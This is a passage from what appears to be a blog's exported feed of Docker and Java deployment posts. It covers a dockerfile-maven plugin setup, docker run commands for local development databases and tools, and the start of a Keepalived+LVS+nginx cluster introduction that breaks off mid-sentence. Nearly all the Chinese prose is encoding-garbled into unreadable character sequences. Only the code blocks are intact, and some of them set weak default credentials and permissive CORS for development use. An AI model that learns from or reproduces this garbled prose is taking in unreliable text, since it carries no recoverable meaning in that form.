<code>pom.xml</code> ä¸­æ·»åŠ  <code>dockerfile-maven</code> æ’ä»¶</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.spotify<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dockerfile-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;docker.plugin.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>default<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">goal</span>&gt;</span>build<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">repository</span>&gt;</span>$&#123;docker.image.prefix&#125;/$&#123;project.artifactId&#125;<span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tag</span>&gt;</span>$&#123;project.version&#125;<span class="tag">&lt;/<span class="name">tag</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">buildArgs</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">JAR_FILE</span>&gt;</span>target/$&#123;project.build.finalName&#125;.jar<span class="tag">&lt;/<span class="name">JAR_FILE</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">buildArgs</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ’ä»¶é…ç½®è¯´æ˜</p><ul><li><p>repository : ç”¨äºå‘½åæ„å»ºé•œåƒçš„å­˜å‚¨åº“</p></li><li><p>tag : æ˜¯æ ‡ç­¾åç§°ï¼Œè¿™é‡ŒæŒ‡å®šæ ‡ç­¾åä¸º <code>pom</code> ä¸­çš„ <code>$&#123;project.version&#125;</code></p></li><li><p>buildArgs : ä¸ºæ„å»ºå‚æ•°ï¼Œå¯ä»¥åœ¨æ„å»ºé‡Œå°†å‚æ•°ä¼ åˆ° <code>Dockerfile</code> ä¸­ï¼Œ<code>$&#123;project.build.finalName&#125;</code> è¡¨ç¤ºæ‰“åŒ…å <code>jar</code> åŒ…çš„åç§°ã€‚è¿™é‡Œæ˜¯å°† <code>jar</code> çš„è·¯å¾„ä¼ é€’åˆ° <code>Dockerfile</code> ä¸­</p></li><li><p>executions : è¿™é‡Œè®¾ç½®æŠŠæ’ä»¶çš„ <code>goal</code> ç»‘å®šåˆ°æŸä¸ª <code>phase</code> ä¸Šï¼Œå®ç°æ‰“åŒ…å®Œæˆåè‡ªåŠ¨æ„å»ºé•œåƒå¹¶æ¨é€ï¼Œè¿™é‡Œæ²¡æœ‰é…ç½®è¿œç¨‹ä»“åº“å› æ­¤ä¸æ¨é€åˆ°è¿œç¨‹ä»“åº“</p></li></ul><blockquote><p><code>phase</code> å’Œ <code>goal</code> å¯ä»¥è¿™æ ·ç†è§£ï¼š<code>maven</code> å‘½ä»¤æ ¼å¼æ˜¯ï¼š<code>mvn phase:goal</code> , ä¾‹å¦‚ <code>mvn package dockerfile:build</code> é‚£ä¹ˆ <code>package</code> å’Œ <code>dockerfile</code> éƒ½æ˜¯ <code>phase</code>, <code>build</code> åˆ™æ˜¯ <code>goal</code> ã€‚</p></blockquote><h4 id="æ·»åŠ -Dockerfile"><a href="#æ·»åŠ -Dockerfile" class="headerlink" title="æ·»åŠ  Dockerfile"></a>æ·»åŠ  Dockerfile</h4><p>åœ¨é¡¹ç›®æ ¹ç›®å½•æ·»åŠ Dockerfile æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>-jdk-alpine</span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> /tmp</span></span><br><span class="line"><span class="keyword">ARG</span> JAR_FILE</span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> <span class="variable">$&#123;JAR_FILE&#125;</span> app.jar</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> bash -c <span class="string">&#x27;touch /app.jar&#x27;</span></span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8010</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;java&quot;</span>,<span class="string">&quot;-Djava.security.egd=file:dev/./urandom&quot;</span>,<span class="string">&quot;-jar&quot;</span>,<span class="string">&quot;/app.jar&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>è¡¨ç¤ºæ¥æ”¶æ„å»ºå‚æ•° <code>JAR_FILE</code> è¿™ä¸ªå‚æ•°åœ¨å‰é¢çš„ <code>pom.xml</code>ä¸­é…ç½®æ’ä»¶æ—¶å·²ç»æ·»åŠ ã€‚å‚æ•°å†…å®¹ä¸º <code>jar</code> çš„çš„è·¯å¾„ï¼Œ<code>$&#123;JAR_FILE&#125;</code> åˆ™æ˜¯ä½¿ç”¨ä¼ é€’è¿›æ¥çš„å‚æ•°</p><h4 id="Docker-è¿œç¨‹"><a href="#Docker-è¿œç¨‹" class="headerlink" title="Docker è¿œç¨‹"></a>Docker è¿œç¨‹</h4><p>éœ€è¦å¼€å¯æœåŠ¡å™¨ <code>Docker</code> çš„è¿œç¨‹è®¿é—®ï¼Œå…·ä½“å¯ä»¥å‚è€ƒç½‘ç»œç›¸å…³æ–‡ç« </p><p>æ‰“å¼€ <code>IDEA</code> ä¸­çš„ <code>Services</code> é¢æ¿</p><p><img src="https://gitee.com/jhon_walker/images/raw/master/path/20210814123702.png"></p><p>ç‚¹å‡» <code>Add service &gt; Docker Connection</code> æ¥æ·»åŠ ä¸€ä¸ª <code>Docker</code> è¿æ¥</p><p><img src="https://gitee.com/jhon_walker/images/raw/master/path/20210814124029.png"></p><blockquote><p><code>dockerfile-maven</code> æ’ä»¶å°±æ˜¯é€šè¿‡åœ¨æœ¬æœºæ“ä½œ <code>Docker api</code> æ„å»ºé•œåƒï¼Œå› æ­¤æœ¬æœºä¸Šä¸éœ€è¦å®‰è£… <code>Docker</code>ï¼Œèƒ½å¤Ÿè®¿é—®åˆ° <code>Docker</code> æœåŠ¡å™¨å³å¯</p></blockquote><h4 id="æ„å»º-image"><a href="#æ„å»º-image" class="headerlink" title="æ„å»º image"></a>æ„å»º image</h4><p><code>Docker</code> æ„å»ºè¿‡ç¨‹å·²ç»é›†æˆåˆ°äº† <code>Maven</code> çš„æ„å»ºè¿‡ç¨‹ä¹‹ä¸­ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ <code>mvn package</code> åŒæ—¶æ‰“åŒ…å’Œæ„å»º <code>Docker</code> é•œåƒ</p><p>åœ¨ <code>IDEA</code> ä¸­å¯ä»¥ç›´æ¥ç‚¹å‡»æ’ä»¶å¯¹åº”çš„å‘½ä»¤è¿è¡Œ</p><p><img src="https://gitee.com/jhon_walker/images/raw/master/path/20210814124600.png"></p><h4 id="é•œåƒ-tag"><a href="#é•œåƒ-tag" class="headerlink" title="é•œåƒ tag"></a>é•œåƒ tag</h4><p>åœ¨ä½¿ç”¨ä¸Šé¢çš„æ–¹å¼ç”Ÿæˆé•œåƒæ—¶ï¼Œæˆ‘ä»¬å‰é¢åœ¨ <code>pom.xml</code> ä¸­å·²ç»é…ç½®äº†æ„å»ºæ—¶çš„ <code>tag</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tag</span>&gt;</span>$&#123;project.version&#125;<span class="tag">&lt;/<span class="name">tag</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœä¸é…ç½®è¿™ä¸ªå‚æ•°ï¼Œé»˜è®¤ç”Ÿæˆçš„ <code>tag</code> æ˜¯ <code>latest</code></p><p>æœ‰æ—¶æƒ³ä¿®æ”¹æˆè‡ªå·±çš„ <code>tag</code> ï¼Œå¯ä»¥é€šè¿‡ <code>dockerfile:tag</code> ä¿®æ”¹ï¼Œä½†éœ€è¦å…ˆæŠŠ <code>pom.xml</code> ä¸­æŒ‡å®šçš„ <code>tag</code> é…ç½®å»æ‰</p><p>åœ¨ <code>pom.xml</code> ä¸­åˆ é™¤å¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tag</span>&gt;</span>$&#123;project.version&#125;<span class="tag">&lt;/<span class="name">tag</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ¥ç€ä½¿ç”¨å¦‚ä¸‹ <code>maven</code> å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn dockerfile:tag -Ddockerfile.tag=myApp</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œæˆå <code>Docker</code> æœåŠ¡å™¨ä¸Šä¼šå‡ºç°ä¸€ä¸ª <code>tag</code> ä¸º <code>myApp</code> çš„æ–°é•œåƒã€‚</p><p>åŒæ ·çš„ï¼Œå¦‚æœåœ¨ <code>pom</code> ä¸­æ²¡æœ‰æŒ‡å®š <code>tag</code>ï¼Œåœ¨ä½¿ç”¨ <code>dockerfile:build</code> æ„å»ºæ–°é•œåƒæ—¶ä¹Ÿå¯ä»¥æŒ‡å®š <code>tag</code> å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn dockerfile:build -Ddockerfile.tag=consumer</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker æœ¬åœ°å¼€å‘å®¹å™¨é›†åˆ</title>
      <link href="post/58712/"/>
      <url>post/58712/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>è‡ªå·±å¸¸ç”¨çš„å®¹å™¨é›†åˆï¼Œåšä¸ªè®°å½•</p><span id="more"></span><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run -it \</span><br><span class="line">--name redis \</span><br><span class="line">--network dev \</span><br><span class="line">-p 6379:6379 \</span><br><span class="line">-v ~/docker/data/redis/:/data \</span><br><span class="line">-v ~/docker/conf/redis/:/etc/redis/ \</span><br><span class="line">-d redis:latest \</span><br><span class="line">redis-server /etc/redis/redis.conf \</span><br><span class="line">--appendonly yes</span><br></pre></td></tr></table></figure><ul><li>å‚æ•°è§£é‡Š<ul><li><code>redis-server /etc/redis/redis.conf</code> - ä»¥é…ç½®æ–‡ä»¶å¯åŠ¨redis</li><li><code>appendonly yes</code> - å¼€å¯redisæŒä¹…åŒ–ï¼Œä¹Ÿå¯ä»é…ç½®æ–‡ä»¶ä¸­å¼€å¯</li></ul></li></ul><h3 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -it \</span><br><span class="line">  --name mysql \</span><br><span class="line">  --network dev \</span><br><span class="line">  -p 3306:3306 \</span><br><span class="line">  -v ~/docker/data/mysql:/var/lib/mysql \</span><br><span class="line">  -v ~/docker/conf/mysql:/etc/mysql/conf.d \</span><br><span class="line">  -e MYSQL_ROOT_PASSWORD=root \</span><br><span class="line">  -d mysql:latest</span><br></pre></td></tr></table></figure><ul><li>å‚æ•°è§£é‡Š<ul><li><code>MYSQL_ROOT_PASSWORD=root</code> - è®¾ç½®æ•°æ®åº“å¯†ç ä¸ºroot</li></ul></li></ul><h3 id="Mongodb"><a href="#Mongodb" class="headerlink" title="Mongodb"></a>Mongodb</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -it \</span><br><span class="line">  --name mongo \</span><br><span class="line">  --network dev \</span><br><span class="line">  -p 27017:27017 \</span><br><span class="line">  -v ~/docker/data/mongo:/data/db \</span><br><span class="line">  -e MONGO_INITDB_ROOT_USERNAME=root \</span><br><span class="line">  -e MONGO_INITDB_ROOT_PASSWORD=root \</span><br><span class="line">  -d mongo:latest</span><br></pre></td></tr></table></figure><ul><li>å‚æ•°è§£é‡Š<ul><li><code>MONGO_INITDB_ROOT_USERNAME=root</code> - è®¾ç½®ç”¨æˆ·å</li><li><code>MONGO_INITDB_ROOT_PASSWORD=root</code> - è®¾ç½®å¯†ç </li></ul></li></ul><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run -it \</span><br><span class="line">  --name php7.4 \</span><br><span class="line">  --network dev \</span><br><span class="line">  -p 8080:8080 \</span><br><span class="line">  -v ~/wwwroot:/wwwroot \</span><br><span class="line">  -d php:7.4</span><br></pre></td></tr></table></figure><ul><li>é¢å¤–æ“ä½œ<ul><li><code>pecl install redis &amp;&amp; docker-php-ext-enable redis</code> - æ·»åŠ redisæ”¯æŒ</li><li><code>pecl install swoole &amp;&amp; docker-php-ext-enable swoole</code> - æ·»åŠ swooleæ”¯æŒ</li><li><code>docker-php-ext-install pdo pdo_mysql</code> - æ·»åŠ pdoæ”¯æŒ</li></ul></li></ul><h3 id="Dozzle"><a href="#Dozzle" class="headerlink" title="Dozzle"></a>Dozzle</h3><p>Dozzle æ˜¯ä¸€ä¸ªå°å‹çš„è½»é‡çº§çš„æ—¥å¿—ç›‘æ§ç¨‹åºï¼Œå®ƒæœ‰ä¸€ä¸ªåŸºäº web çš„ç•Œé¢æ¥ç›‘è§† Docker æ—¥å¿—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker run \</span><br><span class="line">  --name dozzle \</span><br><span class="line">  --volume=/var/run/docker.sock:/var/run/docker.sock \</span><br><span class="line">  -p 8888:8080 \</span><br><span class="line">  -d amir20/dozzle:latest</span><br></pre></td></tr></table></figure><p>å…·ä½“é…ç½®å‚è€ƒ: <a href="https://hub.docker.com/r/amir20/dozzle">https://hub.docker.com/r/amir20/dozzle</a></p><h3 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h3><p>Elasticsearch æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼ã€ RESTful æœç´¢å’Œåˆ†æå¼•æ“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker run \</span><br><span class="line"> --name es \</span><br><span class="line"> --net dev \</span><br><span class="line"> -p 9200:9200 \</span><br><span class="line"> -p 9300:9300 \</span><br><span class="line"> -e <span class="string">&quot;discovery.type=single-node&quot;</span> \</span><br><span class="line"> -e <span class="string">&quot;http.cors.enabled=true&quot;</span> \</span><br><span class="line"> -e <span class="string">&quot;http.cors.allow-origin=*&quot;</span> \</span><br><span class="line"> -e <span class="string">&quot;http.cors.allow-headers=X-Requested-With,X-Auth-Token,Content-Type,Content-Length,Authorization&quot;</span> \</span><br><span class="line"> -e <span class="string">&quot;http.cors.allow-credentials=true&quot;</span> \</span><br><span class="line"> -d elasticsearch:7.14</span><br></pre></td></tr></table></figure><ul><li>å‚æ•°è§£é‡Š<ul><li><code>discovery.type=single-node</code> - å•æœºè¿è¡Œ</li></ul></li></ul><blockquote><p>å¦‚æœå¯åŠ¨ä¸äº†ï¼Œå¯ä»¥åŠ å¤§å†…å­˜è®¾ç½®ï¼š<code>-e ES_JAVA_OPTS=&quot;-Xms512m -Xmx512m&quot;</code></p></blockquote><h4 id="ä¸­æ–‡åˆ†è¯"><a href="#ä¸­æ–‡åˆ†è¯" class="headerlink" title="ä¸­æ–‡åˆ†è¯"></a>ä¸­æ–‡åˆ†è¯</h4><p>è¿›å…¥å®¹å™¨å†…éƒ¨åæ‰§è¡Œ, å®Œæˆåé‡å¯eså®¹å™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/elasticsearch-plugin install https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v7.14.0/elasticsearch-analysis-ik-7.14.0.zip</span><br></pre></td></tr></table></figure><h4 id="å¯è§†åŒ–å·¥å…·"><a href="#å¯è§†åŒ–å·¥å…·" class="headerlink" title="å¯è§†åŒ–å·¥å…·"></a>å¯è§†åŒ–å·¥å…·</h4><p>ç°ä»£åŒ–çš„ Elasticsearch Web UI</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 1358:1358 -d appbaseio/dejavu1</span><br></pre></td></tr></table></figure><p>å…·ä½“é…ç½®å‚è€ƒ: <a href="https://hub.docker.com/r/appbaseio/dejavu">https://hub.docker.com/r/appbaseio/dejavu</a></p><h3 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">docker run \</span><br><span class="line">  --network dev \</span><br><span class="line">  --hostname my-rabbit \</span><br><span class="line">  --name some-rabbit \</span><br><span class="line">  -p 15672:15672 \</span><br><span class="line">  -p 5672:5672 \</span><br><span class="line">  -v ~/docker/data/rabbitmq/:/var/lib/rabbitmq/ \</span><br><span class="line">  -e RABBITMQ_DEFAULT_USER=admin \</span><br><span class="line">  -e RABBITMQ_DEFAULT_PASS=admin \</span><br><span class="line">  -d rabbitmq:3.8.18-management</span><br></pre></td></tr></table></figure><ul><li>å‚æ•°è§£é‡Š<ul><li><code>--hostname my-rabbit</code> - ä¸»æœºå</li><li><code>RABBITMQ_DEFAULT_USER=admin</code> - è®¾ç½®é»˜è®¤è´¦æˆ·</li><li><code>RABBITMQ_DEFAULT_PASS=admin</code> - è®¾ç½®é»˜è®¤å¯†ç </li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Keepalived+LVS+nginx æ­å»º nginx é«˜å¯ç”¨é›†ç¾¤</title>
      <link href="post/36452/"/>
      <url>post/36452/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>nginx æ˜¯ä¸€æ¬¾éå¸¸ä¼˜ç§€çš„åå‘ä»£ç†å·¥å…·ï¼Œæ”¯æŒè¯·æ±‚åˆ†å‘ï¼Œè´Ÿè½½å‡è¡¡ï¼Œä»¥åŠç¼“å­˜ç­‰ç­‰éå¸¸å®ç”¨çš„åŠŸèƒ½ã€‚åœ¨è¯·æ±‚å¤„ç†ä¸Šï¼Œnginx é‡‡ç”¨çš„æ˜¯ epoll æ¨¡å‹ï¼Œè¿™æ˜¯ä¸€ç§åŸºäºäº‹ä»¶ç›‘å¬çš„æ¨¡å‹ï¼Œå› è€Œå…¶å…·å¤‡éå¸¸é«˜æ•ˆçš„è¯·æ±‚å¤„ç†æ•ˆç‡ï¼Œå•æœºå¹¶å‘èƒ½åŠ›èƒ½å¤Ÿè¾¾åˆ°ä¸Šç™¾ä¸‡ã€‚nginx æ¥æ”¶åˆ°çš„è¯·æ±‚å¯ä»¥é€šè¿‡è´Ÿè½½å‡è¡¡ç­–ç•¥åˆ†å‘åˆ°å…¶ä¸‹ä¸€çº§çš„åº”ç”¨æœåŠ¡å™¨ï¼Œè¿™äº›æœåŠ¡å™¨ä¸€èˆ¬æ˜¯ä»¥é›†ç¾¤æ–¹å¼éƒ¨ç½²çš„ï¼Œå› è€Œåœ¨æ€§èƒ½ä¸è¶³çš„æƒ…å†µä¸‹ï¼Œåº”ç”¨æœåŠ¡å™¨å¯ä»¥é€šè¿‡åŠ æœºå™¨çš„æ–¹å¼æ‰©å±•æµé‡ã€‚æ­¤æ—¶ï¼Œå¯¹äºä¸€äº›ç‰¹å¤§å‹çš„ç½‘ç«™ï¼Œæ€§èƒ½çš„ç“¶é¢ˆå°±æ¥è‡ªäº nginx äº†ï¼Œå› ä¸ºå•æœºçš„ nginx çš„å¹¶å‘èƒ½åŠ›æ˜¯æœ‰ä¸Šé™çš„ï¼Œè€Œ nginx æœ¬èº«æ˜¯ä¸æ”¯æŒé›†ç¾¤æ¨¡å¼çš„ï¼Œå› è€Œæ­¤æ—¶å¯¹ nginx çš„æ¨ªå‘æ‰©å±•å°±æ˜¾å¾—å°¤ä¸ºé‡è¦ã€‚</p><span id="more"></span><p>keepalived æ˜¯ä¸€æ¬¾æœåŠ¡å™¨çŠ¶æ€æ£€æµ‹å’Œæ•…éšœåˆ‡æ¢çš„å·¥å…·ã€‚åœ¨å…¶é…ç½®æ–‡ä»¶ä¸­ï¼Œå¯ä»¥é…ç½®ä¸»å¤‡æœåŠ¡å™¨å’Œè¯¥æœåŠ¡å™¨çš„çŠ¶æ€æ£€æµ‹è¯·æ±‚ã€‚ä¹Ÿå°±æ˜¯è¯´ keepalived å¯ä»¥æ ¹æ®é…ç½®çš„è¯·æ±‚ï¼Œåœ¨æä¾›æœåŠ¡æœŸé—´ä¸æ–­å‘æŒ‡å®šæœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œå¦‚æœè¯¥è¯·æ±‚è¿”å›çš„çŠ¶æ€ç æ˜¯ 200ï¼Œåˆ™è¡¨ç¤ºè¯¥æœåŠ¡å™¨çŠ¶æ€æ˜¯æ­£å¸¸çš„ï¼Œå¦‚æœä¸æ­£å¸¸ï¼Œé‚£ä¹ˆ keepalived å°±ä¼šå°†è¯¥æœåŠ¡å™¨ç»™ä¸‹çº¿æ‰ï¼Œç„¶åå°†å¤‡ç”¨æœåŠ¡å™¨è®¾ç½®ä¸ºä¸Šçº¿çŠ¶æ€ã€‚</p><p>lvs æ˜¯ä¸€æ¬¾ç”¨äºå››å±‚è´Ÿè½½å‡è¡¡çš„å·¥å…·ã€‚æ‰€è°“çš„å››å±‚è´Ÿè½½å‡è¡¡ï¼Œå¯¹åº”çš„æ˜¯ç½‘ç»œä¸ƒå±‚åè®®ï¼Œå¸¸è§çš„å¦‚ HTTP åè®®æ˜¯å»ºç«‹åœ¨ä¸ƒå±‚åè®®ä¸Šçš„ï¼Œè€Œ lvs ä½œç”¨äºå››å±‚åè®®ä¸Šï¼Œä¹Ÿå³ï¼šä¼ è¾“å±‚ï¼Œç½‘ç»œå±‚ï¼Œæ•°æ®é“¾è·¯å±‚å’Œç‰©ç†å±‚ã€‚è¿™é‡Œçš„ä¼ è¾“å±‚ä¸»è¦åè®®æœ‰ TCP å’Œ UDP åè®®ï¼Œä¹Ÿå°±æ˜¯è¯´ lvs ä¸»è¦æ”¯æŒçš„æ–¹å¼æ˜¯ TCP å’Œ UDPã€‚ä¹Ÿæ­£æ˜¯å› ä¸º lvs æ˜¯å¤„äºå››å±‚è´Ÿè½½å‡è¡¡ä¸Šçš„ï¼Œå› è€Œå…¶å¤„ç†è¯·æ±‚çš„èƒ½åŠ›æ¯”å¸¸è§çš„æœåŠ¡å™¨è¦é«˜éå¸¸å¤šï¼Œæ¯”å¦‚ nginx çš„è¯·æ±‚å¤„ç†å°±æ˜¯å»ºç«‹åœ¨ç½‘ç»œä¸ƒå±‚ä¸Šçš„ï¼Œlvs çš„è´Ÿè½½å‡è¡¡èƒ½åŠ›æ˜¯ nginx çš„åå€ä»¥ä¸Šã€‚</p><p>é€šè¿‡ä¸Šé¢çš„ä»‹ç»ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œåœ¨ç‰¹å¤§å‹ç½‘ç«™ä¸­ï¼Œåº”ç”¨æœåŠ¡å™¨æ˜¯å¯ä»¥æ¨ªå‘æ‰©å®¹çš„ï¼Œè€Œ nginx æ˜¯ä¸æ”¯æŒæ¨ªå‘æ‰©å®¹çš„ï¼Œæ­¤æ—¶ nginx å°±ä¼šæˆä¸ºæ€§èƒ½ç“¶é¢ˆã€‚è€Œ lvs æ˜¯ä¸€æ¬¾è´Ÿè½½å‡è¡¡å·¥å…·ï¼Œå› è€Œå¦‚æœæˆ‘ä»¬ç»“åˆ lvs å’Œ nginxï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡éƒ¨ç½²å¤šå° nginx æœåŠ¡å™¨ï¼Œé€šè¿‡ lvs çš„è´Ÿè½½å‡è¡¡èƒ½åŠ›ï¼Œå°†è¯·æ±‚å‡è¡¡çš„åˆ†å‘åˆ°å„ä¸ª nginx æœåŠ¡å™¨ä¸Šï¼Œå†ç”± nginx æœåŠ¡å™¨åˆ†å‘åˆ°å„ä¸ªåº”ç”¨æœåŠ¡å™¨ï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬å°±å®ç°äº† nginx çš„æ¨ªå‘æ‰©å±•äº†ã€‚ç”±äº nginx æœ¬è´¨ä¸Šä¹Ÿæ˜¯ä¸€æ¬¾åº”ç”¨æœåŠ¡å™¨ï¼Œå› è€Œå…¶ä¹Ÿæœ‰å¯èƒ½å®•æœºï¼Œå› è€Œè¿™é‡Œç»“åˆ keepalived å°±å¯ä»¥å®ç° nginx çš„æ•…éšœæ£€æµ‹å’ŒæœåŠ¡åˆ‡æ¢ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡ keepalived+lvs+nginxï¼Œæˆ‘ä»¬å®ç°äº† nginx çš„é«˜å¯ç”¨é›†ç¾¤æ¨¡å¼ã€‚</p><p>åœ¨ä¸Šé¢çš„ä»‹ç»ä¸­ï¼Œæˆ‘ä»¬ä¼šæ³¨æ„åˆ°ï¼Œè™½ç„¶ keepalived+lvs+nginx å®ç°äº† nginx çš„é›†ç¾¤æ¨¡å¼ï¼Œä½†æ˜¯åœ¨æˆ‘ä»¬ä½¿ç”¨ nginx çš„æ—¶å€™ï¼Œå…¶æœ¬èº«æ˜¯æœ‰ä¸€ä¸ª ip å’Œç«¯å£çš„ï¼Œé»˜è®¤ç›‘å¬çš„ç«¯å£æ˜¯ 80 å’Œ 443ï¼Œé‚£ä¹ˆ lvs æ˜¯å¦‚ä½•å®ç°å°†è¯·æ±‚åˆ†å‘ç»™å…·æœ‰ä¸åŒ ip å’Œç«¯å£çš„ nginx æœåŠ¡å™¨çš„å‘¢ï¼Ÿè¿™é‡Œå°±æ˜¯é€šè¿‡è™šæ‹Ÿ ip å®ç°çš„ï¼Œæ‰€è°“è™šæ‹Ÿ ip å°±æ˜¯å¯¹å¤–æä¾›ä¸€ä¸ªå…¬å…±çš„ 